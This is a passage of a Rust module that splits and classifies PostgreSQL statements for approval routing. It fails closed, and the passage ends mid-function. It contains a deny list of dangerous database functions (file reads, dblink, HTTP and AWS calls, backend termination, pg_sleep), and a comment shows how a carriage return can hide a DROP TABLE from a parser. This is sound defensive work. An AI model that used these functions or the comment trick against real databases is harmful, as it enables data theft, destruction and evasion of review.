//! SQL statement classification (OWNER: agent agent).
//!
//! Two independent pieces:
//!
//! * [`split_statements`] — a hand-written PostgreSQL lexer that splits a script on top-level
//!   `;`. It deliberately does **not** use `sqlparser`, so it keeps working on SQL that
//!   `sqlparser` cannot parse (`DO` blocks, exotic DDL, vendor extensions). It follows the
//!   server's lexer where the two differ from `sqlparser`: `--` comments end at `\n` **or**
//!   `\r`, and block comments nest.
//! * [`classify`] — `sqlparser` with `PostgreSqlDialect` on each split statement.
//!
//! This is a *routing hint* (approve or not), never the security boundary: "read-only"
//! statements still execute inside a READ ONLY transaction, and the real boundary is a
//! least-privilege database role. The classifier is nevertheless **fail-closed**:
//!
//! * [`StatementClass::ReadOnly`] is returned only when `sqlparser` parsed the statement *and*
//!   the AST is a plain query (with no row locks, `INTO` or data-modifying CTE), an `EXPLAIN`
//!   whose inner statement is itself read-only, a `SHOW <variable>`, or `VALUES`. Text that does
//!   not parse is never read-only, whatever its first keyword says.
//! * A read-only-shaped statement that calls a function with side effects that `BEGIN READ ONLY`
//!   does not stop (`dblink`, `pg_read_file`, `pg_advisory_lock`, `lo_import`, `set_config`,
//!   `nextval`, `pg_terminate_backend`, `pg_sleep` …; see `SIDE_EFFECT_PREFIXES`) classifies as
//!   [`StatementClass::Unknown`], with the function named in the summary. Functions the user
//!   defined themselves cannot be known to the classifier; only a least-privilege role stops those.
//! * Before parsing, a bare `\r` is normalised to `\n`, so `sqlparser` (which ends `--`
//!   comments only at `\n`) sees the same statement boundaries as the server.

use std::borrow::Cow;

use serde::{Deserialize, Serialize};
use sqlparser::ast::{Expr, Query, SetExpr, Statement, UtilityOption, Value};
use sqlparser::dialect::PostgreSqlDialect;
use sqlparser::parser::Parser;

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "camelCase")]
pub enum StatementClass {
    /// SELECT (no INTO / FOR UPDATE / data-modifying CTE / side-effecting function), SHOW,
    /// EXPLAIN of a read-only statement, VALUES. Only ever produced for text that parsed.
    ReadOnly,
    /// BEGIN / COMMIT / ROLLBACK / SET / RESET.
    Session,
    /// INSERT / UPDATE / DELETE / MERGE / COPY FROM / SELECT INTO / EXPLAIN of a write.
    Write,
    /// CREATE / ALTER / DROP / TRUNCATE / GRANT / REVOKE / COMMENT / VACUUM / REINDEX …
    Ddl,
    /// Could not parse, or something we don't recognise, or a query that calls a function with
    /// side effects. Treated as most dangerous.
    Unknown,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct SqlClassification {
    pub statements: Vec<StatementClass>,
    /// Most dangerous class across statements (ordering: ReadOnly < Session < Write < Ddl < Unknown).
    pub overall: StatementClass,
    pub parse_ok: bool,
    /// Short human explanation, e.g. "2 statements: SELECT, DROP TABLE".
    pub summary: String,
}

// ---------------------------------------------------------------------------------------------
// Lexer
// ---------------------------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum TokKind {
    /// Bare identifier or keyword.
    Word,
    /// `"quoted identifier"` (including `U&"…"`).
    QuotedIdent,
    /// `'…'`, `E'…'`, `B'…'`, `X'…'`, `N'…'`, `U&'…'`, `$tag$…$tag$`.
    Str,
    Number,
    Punct,
    LineComment,
    BlockComment,
}

#[derive(Debug, Clone, Copy)]
struct Tok {
    kind: TokKind,
    start: usize,
    end: usize,
}

impl Tok {
    fn is_comment(&self) -> bool {
        matches!(self.kind, TokKind::LineComment | TokKind::BlockComment)
    }
}

fn is_ident_start(b: u8) -> bool {
    b.is_ascii_alphabetic() || b == b'_' || b >= 0x80
}

fn is_ident_cont(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_' || b == b'$' || b >= 0x80
}

/// Scans a `'…'` string body starting just after the opening quote. Returns the index one past
/// the closing quote (or `len` if unterminated). `backslash` enables `E'…'` escapes.
fn scan_quoted(b: &[u8], mut i: usize, quote: u8, backslash: bool) -> usize {
    while i < b.len() {
        let c = b[i];
        if backslash && c == b'\\' {
            i += 2;
            continue;
        }
        if c == quote {
            if b.get(i + 1) == Some(&quote) {
                i += 2;
                continue;
            }
            return i + 1;
        }
        i += 1;
    }
    b.len()
}

/// What a span returned by [`quoted_and_comment_spans`] is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum SpanKind {
    /// A string literal of any form (`'…'`, `E'…'`, `U&'…'`, `$tag$…$tag$`, …).
    Str,
    /// A `"quoted identifier"` (or `U&"…"`).
    QuotedIdent,
    /// A `--` or `/* */` comment.
    Comment,
}

/// The byte ranges this lexer reads as string literals, quoted identifiers and comments, in
/// order. For engines that lex for themselves (Redshift) to check they agree with the classifier.
pub(crate) fn quoted_and_comment_spans(sql: &str) -> Vec<(SpanKind, usize, usize)> {
    lex(sql)
        .into_iter()
        .filter_map(|t| {
            let kind = match t.kind {
                TokKind::Str => SpanKind::Str,
                TokKind::QuotedIdent => SpanKind::QuotedIdent,
                TokKind::LineComment | TokKind::BlockComment => SpanKind::Comment,
                _ => return None,
            };
            Some((kind, t.start, t.end))
        })
        .collect()
}

/// Tokenises PostgreSQL text. Never fails: unterminated strings/comments run to end of input.
fn lex(sql: &str) -> Vec<Tok> {
    let b = sql.as_bytes();
    let n = b.len();
    let mut toks = Vec::new();
    let mut i = 0;
    while i < n {
        let c = b[i];
        // PostgreSQL whitespace is space, \t, \n, \r, \f and \v.
        if c.is_ascii_whitespace() || c == 0x0b {
            i += 1;
            continue;
        }
        let start = i;
        // -- line comment
        if c == b'-' && b.get(i + 1) == Some(&b'-') {
            // PostgreSQL ends a `--` comment at `\n` or `\r` (scan.l: `non_newline [^\n\r]`).
            while i < n && b[i] != b'\n' && b[i] != b'\r' {
                i += 1;
            }
            toks.push(Tok {
                kind: TokKind::LineComment,
                start,
                end: i,
            });
            continue;
        }
        // /* nested block comment */
        if c == b'/' && b.get(i + 1) == Some(&b'*') {
            let mut depth = 1usize;
            i += 2;
            while i < n && depth > 0 {
                if b[i] == b'/' && b.get(i + 1) == Some(&b'*') {
                    depth += 1;
                    i += 2;
                } else if b[i] == b'*' && b.get(i + 1) == Some(&b'/') {
                    depth -= 1;
                    i += 2;
                } else {
                    i += 1;
                }
            }
            toks.push(Tok {
                kind: TokKind::BlockComment,
                start,
                end: i,
            });
            continue;
        }
        if c == b'\'' {
            i = scan_quoted(b, i + 1, b'\'', false);
            toks.push(Tok {
                kind: TokKind::Str,
                start,
                end: i,
            });
            continue;
        }
        if c == b'"' {
            i = scan_quoted(b, i + 1, b'"', false);
            toks.push(Tok {
                kind: TokKind::QuotedIdent,
                start,
                end: i,
            });
            continue;
        }
        if is_ident_start(c) {
            i += 1;
            while i < n && is_ident_cont(b[i]) {
                i += 1;
            }
            let len = i - start;
            let next = b.get(i).copied();
            if len == 1 && next == Some(b'\'') {
                // Single-letter string prefixes. Only E allows backslash escapes.
                match c {
                    b'e' | b'E' => {
                        i = scan_quoted(b, i + 1, b'\'', true);
                        toks.push(Tok {
                            kind: TokKind::Str,
                            start,
                            end: i,
                        });
                        continue;
                    }
                    b'b' | b'B' | b'x' | b'X' | b'n' | b'N' => {
                        i = scan_quoted(b, i + 1, b'\'', false);
                        toks.push(Tok {
                            kind: TokKind::Str,
                            start,
                            end: i,
                        });
                        continue;
                    }
                    _ => {}
                }
            }
            if len == 1 && (c == b'u' || c == b'U') && next == Some(b'&') {
                match b.get(i + 1) {
                    Some(b'\'') => {
                        i = scan_quoted(b, i + 2, b'\'', false);
                        toks.push(Tok {
                            kind: TokKind::Str,
                            start,
                            end: i,
                        });
                        continue;
                    }
                    Some(b'"') => {
                        i = scan_quoted(b, i + 2, b'"', false);
                        toks.push(Tok {
                            kind: TokKind::QuotedIdent,
                            start,
                            end: i,
                        });
                        continue;
                    }
                    _ => {}
                }
            }
            toks.push(Tok {
                kind: TokKind::Word,
                start,
                end: i,
            });
            continue;
        }
        if c == b'$' {
            // $1 style parameter
            if b.get(i + 1).is_some_and(|d| d.is_ascii_digit()) {
                i += 1;
                while i < n && b[i].is_ascii_digit() {
                    i += 1;
                }
                toks.push(Tok {
                    kind: TokKind::Number,
                    start,
                    end: i,
                });
                continue;
            }
            // $tag$ … $tag$
            let mut j = i + 1;
            if j < n && is_ident_start(b[j]) {
                while j < n && is_ident_cont(b[j]) && b[j] != b'$' {
                    j += 1;
                }
            }
            if j < n && b[j] == b'$' {
                let tag = &sql[i..=j];
                let body_start = j + 1;
                let end = match sql[body_start..].find(tag) {
                    Some(off) => body_start + off + tag.len(),
                    None => n,
                };
                i = end;
                toks.push(Tok {
                    kind: TokKind::Str,
                    start,
                    end: i,
                });
                continue;
            }
            i += 1;
            toks.push(Tok {
                kind: TokKind::Punct,
                start,
                end: i,
            });
            continue;
        }
        if c.is_ascii_digit() {
            i += 1;
            while i < n && (b[i].is_ascii_alphanumeric() || b[i] == b'.' || b[i] == b'_') {
                i += 1;
            }
            toks.push(Tok {
                kind: TokKind::Number,
                start,
                end: i,
            });
            continue;
        }
        // Everything else is a single ASCII punctuation byte (non-ASCII is handled as ident).
        i += 1;
        toks.push(Tok {
            kind: TokKind::Punct,
            start,
            end: i,
        });
    }
    toks
}

fn word_lower(sql: &str, t: &Tok) -> String {
    sql[t.start..t.end].to_ascii_lowercase()
}

/// Splits a script into statements for sequential execution, respecting quotes, dollar-quoting
/// and comments. Hand-written lexer (no `sqlparser`), so it never fails: unterminated quotes
/// or comments simply run to the end of the input.
///
/// Handles `'…'` with `''`, `E'…'` with backslash escapes, `"…"` identifiers, `$tag$…$tag$`,
/// `--` comments (ended by `\n` or `\r`) and nested `/* */` comments, and SQL-standard `CREATE FUNCTION … BEGIN ATOMIC … END`
/// bodies. Statements are trimmed, keep their original text (including interior comments),
/// and lose the trailing `;`. Empty and comment-only statements are dropped.
pub fn split_statements(sql: &str) -> Vec<String> {
    let toks = lex(sql);
    let mut out = Vec::new();
    let mut seg_start = 0usize;
    let mut has_code = false;

    // `CREATE … FUNCTION/PROCEDURE … BEGIN ATOMIC … END` keeps its inner semicolons.
    let mut first_words: Vec<String> = Vec::new();
    let mut prev_word = String::new();
    let mut atomic: Option<u32> = None;

    for t in &toks {
        if t.is_comment() {
            continue;
        }
        let is_semicolon = t.kind == TokKind::Punct && &sql[t.start..t.end] == ";";
        if is_semicolon && atomic.is_none() {
            if has_code {
                out.push(sql[seg_start..t.start].trim().to_string());
            }
            seg_start = t.end;
            has_code = false;
            first_words.clear();
            prev_word.clear();
            continue;
        }
        has_code = true;
        if t.kind == TokKind::Word {
            let w = word_lower(sql, t);
            if first_words.len() < 8 {
                first_words.push(w.clone());
            }
            match atomic {
                None => {
                    if w == "atomic"
                        && prev_word == "begin"
                        && first_words.first().is_some_and(|f| f == "create")
                        && first_words
                            .iter()
                            .any(|f| f == "function" || f == "procedure")
                    {
                        atomic = Some(1);
                    }
                }
                Some(depth) => {
                    if w == "case" {
                        atomic = Some(depth + 1);
                    } else if w == "end" {
                        atomic = if depth <= 1 { None } else { Some(depth - 1) };
                    }
                }
            }
            prev_word = w;
        } else {
            prev_word.clear();
        }
    }
    if has_code {
        let tail = sql[seg_start..].trim();
        if !tail.is_empty() {
            out.push(tail.to_string());
        }
    }
    out
}

// ---------------------------------------------------------------------------------------------
// Classifier
// ---------------------------------------------------------------------------------------------

/// Result of classifying one split statement.
struct Item {
    class: StatementClass,
    label: String,
    parsed: bool,
}

/// Classifies a script. See the module docs: this is advisory routing, not a security boundary,
/// but it fails closed (unparsed text is never read-only).
///
/// An empty or comment-only script has no statements and classifies as `ReadOnly` (it can do
/// nothing), with `parse_ok = true`.
pub fn classify(sql: &str) -> SqlClassification {
    let stmts = split_statements(sql);
    let mut classes = Vec::with_capacity(stmts.len());
    let mut labels = Vec::with_capacity(stmts.len());
    let mut parse_ok = true;
    for s in &stmts {
        let item = classify_statement(s);
        parse_ok &= item.parsed;
        classes.push(item.class);
        labels.push(item.label);
    }
    let overall = classes
        .iter()
        .copied()
        .max()
        .unwrap_or(StatementClass::ReadOnly);
    let n = stmts.len();
    let summary = match n {
        0 => "no statements".to_string(),
        1 => format!("1 statement: {}", labels.join(", ")),
        _ => format!("{n} statements: {}", labels.join(", ")),
    };
    SqlClassification {
        statements: classes,
        overall,
        parse_ok,
        summary,
    }
}

fn parse(text: &str) -> Option<Vec<Statement>> {
    match Parser::parse_sql(&PostgreSqlDialect {}, text) {
        Ok(v) if !v.is_empty() => Some(v),
        _ => None,
    }
}

/// Rewrites every `\r` that is not part of `\r\n` to `\n`.
///
/// PostgreSQL ends a `--` comment at either character; `sqlparser` only at `\n`. Without this a
/// statement such as `--x\rDROP TABLE t` is one comment to `sqlparser` and a DROP to the server.
fn normalise_cr(s: &str) -> Cow<'_, str> {
    let b = s.as_bytes();
    let has_bare_cr = b
        .iter()
        .enumerate()
        .any(|(i, &c)| c == b'\r' && b.get(i + 1) != Some(&b'\n'));
    if !has_bare_cr {
        return Cow::Borrowed(s);
    }
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\r' && chars.peek() != Some(&'\n') {
            out.push('\n');
        } else {
            out.push(c);
        }
    }
    Cow::Owned(out)
}

/// Lower-cased code words of a statement (comments, strings and punctuation skipped), plus the
/// token list for position-based work.
struct Words {
    toks: Vec<Tok>,
    /// Indices into `toks` of non-comment tokens.
    code: Vec<usize>,
}

impl Words {
    fn new(sql: &str) -> Self {
        let toks = lex(sql);
        let code = toks
            .iter()
            .enumerate()
            .filter(|(_, t)| !t.is_comment())
            .map(|(i, _)| i)
            .collect();
        Self { toks, code }
    }
    fn tok(&self, n: usize) -> Option<&Tok> {
        self.code.get(n).map(|&i| &self.toks[i])
    }
    /// Lower-cased word at code position `n`, if that token is a bare word.
    fn word(&self, sql: &str, n: usize) -> Option<String> {
        self.tok(n)
            .filter(|t| t.kind == TokKind::Word)
            .map(|t| word_lower(sql, t))
    }
    fn is_punct(&self, sql: &str, n: usize, p: &str) -> bool {
        self.tok(n)
            .is_some_and(|t| t.kind == TokKind::Punct && &sql[t.start..t.end] == p)
    }
    /// All bare words, lower-cased.
    fn all_words(&self, sql: &str) -> Vec<String> {
        self.code
            .iter()
            .map(|&i| &self.toks[i])
            .filter(|t| t.kind == TokKind::Word)
            .map(|t| word_lower(sql, t))
            .collect()
    }
    /// Whether a top-level `;` token is still present (the splitter removes them, except inside
    /// `BEGIN ATOMIC` bodies or when two lexers disagree).
    fn has_semicolon(&self, sql: &str) -> bool {
        (0..self.code.len()).any(|n| self.is_punct(sql, n, ";"))
    }
}

fn classify_statement(raw: &str) -> Item {
    let text = normalise_cr(raw);
    let mut item = classify_normalised(&text);
    // PostgreSQL nests block comments; Trino and others end them at the first `*/`. Text after an
    // inner `/*` may be code to the engine that runs it, so never vouch for such a statement.
    if matches!(
        item.class,
        StatementClass::ReadOnly | StatementClass::Session
    ) && has_nested_comment(&text)
    {
        return Item {
            class: StatementClass::Unknown,
            label: format!("{} (nested comment)", item.label),
            parsed: false,
        };
    }
    if matches!(
        item.class,
        StatementClass::ReadOnly | StatementClass::Session
    ) && let Some(call) = side_effect_function(&text)
    {
        item = Item {
            class: StatementClass::Unknown,
            label: format!("{} calling {call}", item.label),
            parsed: item.parsed,
        };
    }
    // Backstop for the fail-closed rule: text that did not parse is never read-only.
    if item.class == StatementClass::ReadOnly && !item.parsed {
        item.class = StatementClass::Unknown;
        item.label.push_str(" (unparsed)");
    }
    item
}

fn has_nested_comment(text: &str) -> bool {
    lex(text)
        .iter()
        .filter(|t| t.kind == TokKind::BlockComment)
        .any(|t| text[t.start + 2..t.end].contains("/*"))
}

fn classify_normalised(text: &str) -> Item {
    let w = Words::new(text);
    let first = match w.tok(0) {
        Some(t) if t.kind == TokKind::Word => word_lower(text, t),
        // A parenthesised query: `(SELECT 1) UNION (SELECT 2)`.
        Some(t) if t.kind == TokKind::Punct && &text[t.start..t.end] == "(" => "select".to_string(),
        Some(_) => String::new(),
        None => String::new(),
    };
    let second = w.word(text, 1).unwrap_or_default();

    match first.as_str() {
        "select" | "with" | "values" | "table" => classify_query_like(text, &w, &first),
        "explain" => classify_explain(text, &w),
        "show" => classify_show(text),

        "begin" | "start" | "commit" | "end" | "rollback" | "abort" | "savepoint" | "release"
        | "set" | "reset" | "discard" | "declare" | "fetch" | "move" | "close" | "listen"
        | "unlisten" | "deallocate" | "prepare" => {
            // Two-phase commit statements act on other sessions' transactions.
            let two_phase = second == "prepared" || (first == "prepare" && second == "transaction");
            let stmts = parse(text);
            let parsed = stmts.is_some();
            // A session statement is only trusted when it is the whole text: exactly one
            // statement to `sqlparser` and no stray `;` token for our lexer.
            let alone = stmts.as_ref().is_none_or(|v| v.len() == 1) && !w.has_semicolon(text);
            if !alone {
                return Item {
                    class: StatementClass::Unknown,
                    label: format!("{} (multiple statements)", first.to_uppercase()),
                    parsed,
                };
            }
            let class = if two_phase {
                StatementClass::Write
            } else {
                StatementClass::Session
            };
            let label = if two_phase {
                format!("{} {}", first.to_uppercase(), second.to_uppercase())
            } else {
                first.to_uppercase()
            };
            Item {
                class,
                label,
                parsed,
            }
        }

        "insert" | "update" | "delete" | "merge" | "copy" | "lock" | "notify" => Item {
            class: StatementClass::Write,
            label: first.to_uppercase(),
            parsed: parse(text).is_some(),
        },

        "create" | "alter" | "drop" => Item {
            class: StatementClass::Ddl,
            label: ddl_label(text, &w, &first),
            parsed: parse(text).is_some(),
        },
        "refresh" => Item {
            class: StatementClass::Ddl,
            label: "REFRESH MATERIALIZED VIEW".into(),
            parsed: parse(text).is_some(),
        },
        "truncate" | "grant" | "revoke" | "comment" | "vacuum" | "analyze" | "analyse"
        | "reindex" | "cluster" | "reassign" | "checkpoint" | "load" | "import" | "security" => {
            let label = if first == "analyse" {
                "ANALYZE".to_string()
            } else {
                first.to_uppercase()
            };
            Item {
                class: StatementClass::Ddl,
                label,
                parsed: parse(text).is_some(),
            }
        }

        // They can do anything: stored procedures, anonymous blocks, prepared statements.
        "call" | "do" | "execute" => Item {
            class: StatementClass::Unknown,
            label: first.to_uppercase(),
            parsed: parse(text).is_some(),
        },

        _ => Item {
            class: StatementClass::Unknown,
            label: format!(
                "{} (unparsed)",
                if first.is_empty() {
                    "?".into()
                } else {
                    first.to_uppercase()
                }
            ),
            parsed: false,
        },
    }
}

/// `SHOW <variable>` is read-only; any other `SHOW` form, or one `sqlparser` rejects, goes to
/// approval.
fn classify_show(text: &str) -> Item {
    match parse(text) {
        Some(stmts)
            if stmts.iter().all(
                |s| matches!(s, Statement::ShowVariable { variable } if !variable.is_empty()),
            ) =>
        {
            Item {
                class: StatementClass::ReadOnly,
                label: "SHOW".into(),
                parsed: true,
            }
        }
        Some(_) => Item {
            class: StatementClass::Unknown,
            label: "SHOW (unrecognised form)".into(),
            parsed: true,
        },
        None => Item {
            class: StatementClass::Unknown,
            label: "SHOW (unparsed)".into(),
            parsed: false,
        },
    }
}

/// `CREATE TABLE`, `DROP INDEX`, `ALTER MATERIALIZED VIEW` … labels. Skips modifiers.
fn ddl_label(text: &str, w: &Words, first: &str) -> String {
    const MODIFIERS: &[&str] = &[
        "or",
        "replace",
        "temporary",
        "temp",
        "unlogged",
        "global",
        "local",
        "unique",
        "concurrently",
        "trusted",
        "recursive",
        "if",
        "not",
        "exists",
    ];
    // Object words that are only meaningful with the following word.
    const PAIRS: &[&str] = &[
        "materialized",
        "foreign",
        "event",
        "text",
        "access",
        "default",
        "constraint",
    ];
    let mut label = first.to_uppercase();
    let mut n = 1;
    while let Some(word) = w.word(text, n) {
        n += 1;
        if MODIFIERS.contains(&word.as_str()) {
            continue;
        }
        label.push(' ');
        label.push_str(&word.to_uppercase());
        if PAIRS.contains(&word.as_str())
            && let Some(next) = w.word(text, n)
        {
            label.push(' ');
            label.push_str(&next.to_uppercase());
        }
        break;
    }
    label
}

/// Words that mean "this thing writes" in a statement we could not (fully) understand.
fn has_write_words(words: &[String]) -> bool {
    words.windows(1).any(|w| {
        matches!(
            w[0].as_str(),
            "insert" | "update" | "delete" | "merge" | "into"
        )
    }) || has_lock_clause(words)
}

fn has_lock_clause(words: &[String]) -> bool {
    words
        .windows(2)
        .any(|p| p[0] == "for" && matches!(p[1].as_str(), "update" | "share" | "no" | "key"))
}

/// Class and label of a statement whose AST we understand: queries and the four DML statements.
/// Anything else is `None` and the caller decides (always something stricter than read-only).
fn classify_parsed(st: &Statement, lock_words: bool) -> Option<(StatementClass, String)> {
    Some(match st {
        Statement::Query(q) => query_class(q, lock_words),
        Statement::Insert(_) => (StatementClass::Write, "INSERT".to_string()),
        Statement::Update(_) => (StatementClass::Write, "UPDATE".to_string()),
        Statement::Delete(_) => (StatementClass::Write, "DELETE".to_string()),
        Statement::Merge(_) => (StatementClass::Write, "MERGE".to_string()),
        _ => return None,
    })
}

fn classify_query_like(text: &str, w: &Words, first: &str) -> Item {
    let words = w.all_words(text);
    match parse(text) {
        Some(stmts) => {
            let lock_words = has_lock_clause(&words);
            let mut class = StatementClass::ReadOnly;
            let mut label = String::new();
            for st in &stmts {
                let (c, l) = classify_parsed(st, lock_words)
                    .unwrap_or((StatementClass::Unknown, first.to_uppercase()));
                class = class.max(c);
                if !label.is_empty() {
                    label.push_str(", ");
                }
                label.push_str(&l);
            }
            Item {
                class,
                label,
                parsed: true,
            }
        }
        None => {
            // Unparseable text is never read-only. Mentioning a write word makes it a write;
            // otherwise we simply do not know.
            let (class, label) = if has_write_words(&words) {
                (
                    StatementClass::Write,
                    format!("{} (unparsed, may write)", first.to_uppercase()),
                )
            } else {
                (
                    StatementClass::Unknown,
                    format!("{} (unparsed)", first.to_uppercase()),
                )
            };
            Item {
                class,
                label,
                parsed: false,
            }
        }
    }
}

/// Class and label of a parsed query. Anything that locks rows, creates a table, or modifies
/// data inside a CTE is a write.
fn query_class(q: &Query, lock_words: bool) -> (StatementClass, String) {
    match write_reason(q) {
        Some(reason) => (StatementClass::Write, reason.to_string()),
        None if lock_words => (StatementClass::Write, "SELECT FOR UPDATE/SHARE".to_string()),
        None => {
            let label = if matches!(*q.body, SetExpr::Values(_)) {
                "VALUES"
            } else {
                "SELECT"
            };
            (StatementClass::ReadOnly, label.to_string())
        }
    }
}

fn write_reason(q: &Query) -> Option<&'static str> {
    if !q.locks.is_empty() {
        return Some("SELECT FOR UPDATE/SHARE");
    }
    if let Some(with) = &q.with {
        for cte in &with.cte_tables {
            if matches!(
                *cte.query.body,
                SetExpr::Insert(_) | SetExpr::Update(_) | SetExpr::Delete(_) | SetExpr::Merge(_)
            ) {
                return Some("WITH (data-modifying CTE)");
            }
            if let Some(r) = write_reason(&cte.query) {
                return Some(r);
            }
        }
    }
    set_expr_reason(&q.body)
}

fn set_expr_reason(body: &SetExpr) -> Option<&'static str> {
    match body {
        SetExpr::Select(s) if s.into.is_some() => Some("SELECT INTO"),
        SetExpr::Select(_) | SetExpr::Values(_) | SetExpr::Table(_) => None,
        SetExpr::Query(q) => write_reason(q),
        SetExpr::SetOperation { left, right, .. } => {
            set_expr_reason(left).or_else(|| set_expr_reason(right))
        }
        SetExpr::Insert(_) | SetExpr::Update(_) | SetExpr::Delete(_) | SetExpr::Merge(_) => {
            Some("data-modifying statement")
        }
    }
}

// ---------------------------------------------------------------------------------------------
// EXPLAIN
// ---------------------------------------------------------------------------------------------

/// Byte offset of the statement that follows `EXPLAIN [ANALYZE] [VERBOSE]` or
/// `EXPLAIN ( option [, …] )`.
fn explain_inner_start(text: &str, w: &Words) -> Option<usize> {
    let mut n = 1;
    if w.is_punct(text, n, "(") {
        let mut depth = 0i32;
        let mut m = n;
        while let Some(t) = w.tok(m) {
            if t.kind == TokKind::Punct {
                match &text[t.start..t.end] {
                    "(" => depth += 1,
                    ")" => {
                        depth -= 1;
                        if depth == 0 {
                            break;
                        }
                    }
                    _ => {}
                }
            }
            m += 1;
        }
        n = m + 1;
    } else {
        while let Some(word) = w.word(text, n) {
            match word.as_str() {
                "analyze" | "analyse" | "verbose" => n += 1,
                _ => break,
            }
        }
    }
    w.tok(n).map(|t| t.start)
}

/// Whether an option argument spells "off". Anything we cannot read as off counts as on, so
/// `ANALYZE`, `ANALYZE true`, `ANALYZE on`, `ANALYZE 1` and `ANALYZE 'yes'` all execute.
fn option_is_off(arg: Option<&Expr>) -> bool {
    let off_word = |s: &str| matches!(s.to_ascii_lowercase().as_str(), "false" | "off" | "0");
    match arg {
        Some(Expr::Value(v)) => match &v.value {
            Value::Boolean(b) => !*b,
            Value::Number(n, _) => matches!(n.to_string().as_str(), "0"),
            Value::SingleQuotedString(s) => off_word(s),
            _ => false,
        },
        Some(Expr::Identifier(i)) => off_word(&i.value),
        _ => false,
    }
}

/// Whether `EXPLAIN` will execute the statement: the legacy `ANALYZE` keyword, or an `ANALYZE`
/// utility option (any case, quoted or not) whose argument is not an explicit "off".
fn explain_analyzes(analyze: bool, options: Option<&[UtilityOption]>) -> bool {
    analyze
        || options.into_iter().flatten().any(|o| {
            let name = o.name.value.to_ascii_lowercase();
            (name == "analyze" || name == "analyse") && !option_is_off(o.arg.as_ref())
        })
}

/// `EXPLAIN [ANALYZE] [VERBOSE] stmt` and `EXPLAIN (opt, …) stmt`.
///
/// Fail-closed: the class is that of the *inner* statement whether or not it is executed
/// (EXPLAIN of a DELETE needs approval; EXPLAIN of a SELECT does not), so a mis-read of the
/// option list can never turn a write into a read. `ANALYZE` only shows up in the label. If
/// `sqlparser` cannot parse the whole thing the result is never read-only.
fn classify_explain(text: &str, w: &Words) -> Item {
    let explain = parse(text).and_then(|mut v| if v.len() == 1 { v.pop() } else { None });
    if let Some(Statement::Explain {
        analyze,
        options,
        statement,
        ..
    }) = explain
    {
        let analyzing = explain_analyzes(analyze, options.as_deref());
        let lock_words = has_lock_clause(&w.all_words(text));
        let (class, inner_label, inner_parsed) = match classify_parsed(&statement, lock_words) {
            Some((c, l)) => (c, l, true),
            // DDL, CALL, EXECUTE … inside EXPLAIN: use the keyword-level classification, but
            // never let it come out read-only because the AST disagreed with the text.
            None => match explain_inner_start(text, w).map(|s| classify_statement(&text[s..])) {
                Some(i) => {
                    let class = if i.class == StatementClass::ReadOnly {
                        StatementClass::Unknown
                    } else {
                        i.class
                    };
                    (class, i.label, i.parsed)
                }
                None => (StatementClass::Unknown, "?".to_string(), false),
            },
        };
        let label = if analyzing {
            format!("EXPLAIN ANALYZE {inner_label}")
        } else {
            format!("EXPLAIN {inner_label}")
        };
        return Item {
            class,
            label,
            parsed: inner_parsed,
        };
    }
    // sqlparser rejected it (or saw several statements): classify what follows the header,
    // and never call that read-only.
    match explain_inner_start(text, w).map(|s| classify_statement(&text[s..])) {
        Some(i) => Item {
            class: match i.class {
                StatementClass::ReadOnly | StatementClass::Session => StatementClass::Unknown,
                c => c,
            },
            label: format!("EXPLAIN {}", i.label),
            parsed: false,
        },
        None => Item {
            class: StatementClass::Unknown,
            label: "EXPLAIN (unparsed)".into(),
            parsed: false,
        },
    }
}

// ---------------------------------------------------------------------------------------------
// Side-effecting functions
// ---------------------------------------------------------------------------------------------

/// Function-name prefixes (lower case) that do something `BEGIN READ ONLY` does not undo or stop.
const SIDE_EFFECT_PREFIXES: &[&str] = &[
    // Other servers and the file system.
    "dblink",
    "postgres_fdw_",
    "pg_read_",
    "pg_ls_",
    "pg_file_",
    "pg_logdir_",
    "lo_",
    // Session-level locks outlive a rollback; sleeping is a cheap denial of service.
    "pg_advisory_",
    "pg_try_advisory_",
    "pg_sleep",
    // Backend / server control.
    "pg_terminate_",
    "pg_cancel_",
    "pg_signal_",
    "pg_reload_",
    "pg_rotate_",
    "pg_switch_",
    "pg_promote",
    "pg_log_",
    "pg_backup_",
    "pg_start_backup",
    "pg_stop_backup",
    "pg_wal_replay_",
    "pg_create_",
    "pg_drop_",
    "pg_copy_",
    "pg_replication_",
    "pg_logical_",
    "pg_stat_reset",
    "pg_stat_statements_reset",
    "pg_set_",
    "pg_clear_",
    "pg_import_",
    "pg_truncate_",
    "pg_prewarm",
    "pg_background_",
    // Functions that run SQL passed to them as text.
    "query_to_",
    "ts_stat",
    "ts_rewrite",
    "cursor_to_",
    "table_to_xml",
    "schema_to_xml",
    "database_to_xml",
    // Extensions that call out of the database.
    "http_",
];

/// Exact function names (lower case) with side effects.
const SIDE_EFFECT_NAMES: &[&str] = &[
    "pg_notify",
    "set_config",
    "nextval",
    "setval",
    "txid_current",
    "pg_current_xact_id",
    "pg_stat_file",
    "lowrite",
    "loread",
    // Amazon Redshift workload and cluster administration.
    "change_query_priority",
    "change_session_priority",
    "change_user_priority",
    "reboot_cluster",
];

/// Schemas whose every function is treated as side-effecting (extensions that reach outside the
/// database or schedule work).
const SIDE_EFFECT_SCHEMAS: &[&str] = &["dblink", "cron", "aws_s3", "aws_lambda", "net", "pgmq"];

/// Whether calling `schema.name(…)` can have effects that a READ ONLY transaction does not stop.
/// Matching ignores case and quoting; schema qualification only matters for extension schemas.
fn is_side_effect_fn(schema: Option<&str>, name: &str) -> bool {
    schema.is_some_and(|s| SIDE_EFFECT_SCHEMAS.contains(&s))
        || SIDE_EFFECT_NAMES.contains(&name)
        || SIDE_EFFECT_PREFIXES.iter().any(|p| name.starts_with(p))
}

/// Identifier text of a `Word` or `QuotedIdent` token: lower-cased, quotes removed. The flag is
/// set for `U&"…"` identifiers that use escapes, which can spell any name.
fn ident_text(sql: &str, t: &Tok) -> (String, bool) {
    let raw = &sql[t.start..t.end];
    if t.kind == TokKind::Word {
        return (raw.to_ascii_lowercase(), false);
    }
    let (body, unicode) = match raw.strip_prefix("U&").or_else(|| raw.strip_prefix("u&")) {
        Some(rest) => (rest, true),
        None => (raw, false),
    };
    let inner = body.strip_prefix('"').unwrap_or(body);
